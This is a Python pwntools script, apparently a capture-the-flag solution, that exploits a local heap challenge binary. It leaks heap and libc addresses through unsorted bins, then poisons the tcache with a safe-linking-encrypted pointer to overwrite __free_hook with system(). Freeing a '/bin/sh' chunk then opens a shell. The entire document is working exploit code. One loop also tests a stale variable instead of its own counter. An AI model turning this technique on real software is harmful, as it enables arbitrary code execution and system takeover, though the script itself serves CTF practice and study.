#!/usr/bin/python3
from pwn import *

p = process(["../public/chall"])
libc = ELF("../public/libc.so.6")

# context.log_level = 'debug'

def add_4bytes(num):
    x = num - 3000000
    y = num - x
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"x: ", str(x).encode())
    p.sendlineafter(b"y: ", str(y).encode())

def set(z):
    x = z & 0xffffffff  # 1st 4 bytes 0x00000000000xxxxxxxxx
    y = ((z & 0xffffffff00000000) >> 32)  # 2nd 4 bytes 0xxxxxxxxxx00000000000
    add_4bytes(x)
    add_4bytes(y)

def alloc_free(inp):
    p.sendlineafter(b"do? ", str(inp).encode())
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"(y/n)", b"y")

def alloc(inp):
    p.sendlineafter(b"do? ", str(inp).encode())

def free():
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"(y/n) ", b"y")

def encrypt(heapbase,target):
	return (heapbase >> 0xc) ^ target

## setup unsorted bins to leak libc base
# set bins 0x90 - 0x100
for i in range(76, 144, 8):
    alloc_free(i)

# change to size 0x90
count = 36
for i in range(128, 68, -8):
    alloc(i)
    for j in range(count):
        if j % 2 == 0:
            set(0x90)
        else:
            set(0x91)
    count -= 2
    free()

for i in range(144, 84, -8):
    alloc_free(i)

alloc(76) # to allocate into 0x90 unsortedbin

p.sendlineafter(b"> ", b"6")
p.recvuntil(b"Result : ")
heap_base = int(hex(int(p.recvuntil(b"\n", drop=True).decode()))+"000",16)

log.info(f"Heap base: {hex(heap_base)}")

free()

alloc_free(78) # to allocate into 0x90 unsortedbin

# Use the unsorted bins, so new heap will allocated like usual. grow up
alloc(52)  # 0x70

# Leak libc
# arena address (unsorted bins) - libc base (get from vmmaps)
p.sendlineafter(b"> ", b"6")
p.recvuntil(b"Result : ")
libc.address = (int(p.recvuntil(b"\n", drop=True)) - 0x1e0c80)

free_hook = libc.symbols['__free_hook']
systems = libc.symbols['system']

log.info(f"Libc Base: {hex(libc.address)}")
log.info(f"__free_hook: {hex(free_hook)}")
log.info(f"System: {hex(systems)}")

free()

## Free_hook as fd, then fill with system
# For edit the first fd 0x30 to free_hook and change size to 0x61
alloc_free(40)  # 0x60

# Create 1 chunk that have 2 tcache, like 0x90 before. To make count not 0 when free_hook in tcache
for i in range(20, 32, 6): # create 0x30, 0x40 sequentially
    alloc_free(i)

# change size to 0x30
count = 8
for i in range(26, 14, -6):
    alloc(i)
    for j in range(count):
        if j % 2 == 0:
            set(0x30)
        else:
            set(0x31)
    count -= 2
    free()

# Fill the tcache [0x30] to make count 2
for i in range(26, 14, -6):
    alloc_free(i)

alloc(40) # Edit the first fd tcache [0x30] to free_hook

# Fill up the gap
for i in range(18):
    if j % 2 == 0:
        set(0x40)
    else:
        set(0x41) # Set the size to 0x41, so when freed goes to tcache [0x40]

set(encrypt(heap_base,free_hook)) # fd = free_hook
free()
alloc_free(20)  # free the first tcache [0x30], so now belong to 0x60, and free_hook is tcache [0x30]

alloc(20) # allocate 0x30, goes to overwrite free_hook

set(systems) # fill free_hook to system
free() # error here, but no problem

alloc(28) # just create another chunk with different size to store /bin/sh
set(int.from_bytes(b'/bin/sh\x00', "little")) # /bin/sh
p.sendlineafter(b">", b"5") # free

# gdb.attach(p)

# Enjoy shell
p.interactive()